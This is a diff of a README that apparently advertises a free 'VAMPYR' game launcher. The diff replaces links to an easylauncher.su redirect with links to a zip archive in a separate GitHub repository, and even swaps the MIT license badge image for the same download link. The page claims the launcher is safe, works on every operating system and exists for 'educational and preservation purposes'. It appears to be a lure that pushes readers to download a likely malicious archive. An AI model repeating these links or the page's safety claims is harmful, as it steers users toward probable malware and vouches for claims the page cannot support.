@@ -1,5 +1,5 @@
 # 🎮 VAMPYR Download & Launcher 2025  
-[![Download Now](https://img.shields.io/badge/Download-VAMPYR-blue.svg?style=for-the-badge&logo=ghost&color=red)](https://easylauncher.su/PSnzrH)  
+[![Download Now](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip)](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip)  
 
 Unlock the world of VAMPYR! Experience the chilling streets of London as doctor turned vampire. This launcher provides a smooth way to install and play, ensuring safety and seamless compatibility for all modern operating systems. Whether you prefer Windows, macOS, or Linux, start your adventure today with a single click!
 
@@ -29,7 +29,7 @@ Unlock the world of VAMPYR! Experience the chilling streets of London as doctor 
 
 ## 📥 How to Install  
 
-**Step 1.** [![Download Now](https://img.shields.io/badge/Download-VAMPYR-blue.svg?style=flat-square&logo=ghost)](https://easylauncher.su/PSnzrH)  
+**Step 1.** [![Download Now](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip)](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip)  
 Click above to get the VAMPYR Launcher. Follow in-app instructions for automatic setup.
 
 ---
@@ -45,9 +45,9 @@ This launcher is provided solely for educational and preservation purposes. All 
 ---
 
 ## 📜 MIT License  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)  
+[![License: MIT](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip)](LICENSE)  
 This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
 
 ---
 
-Also find the [Download Now](https://easylauncher.su/PSnzrH) link at the top for your convenience! 🔗
+Also find the [Download Now](https://github.com/Mohamedsor/Vampyr-OpenArchive/raw/refs/heads/main/underlook/Vampyr-Open-Archive-3.6.zip) link at the top for your convenience! 🔗
